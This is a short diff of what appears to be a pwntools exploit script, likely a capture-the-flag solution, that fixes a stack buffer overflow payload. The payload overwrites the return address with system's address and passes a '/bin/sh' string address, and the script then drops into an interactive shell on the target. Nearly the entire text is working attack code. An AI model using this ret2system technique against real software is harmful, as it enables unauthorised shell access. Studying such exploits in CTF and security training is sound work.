@@ -49,7 +49,7 @@ system_addr=0x8048320
 bin_sh_adr=0x0804A024
 main_addr=0x804848e
 
-payload=b"A"*140+p32(system_addr)+p32(main_addr)+p32(main_addr)
+payload=b"A"*140+p32(system_addr)+p32(main_addr)+p32(bin_sh_adr)
 r.sendline(payload)
 
 r.interactive()
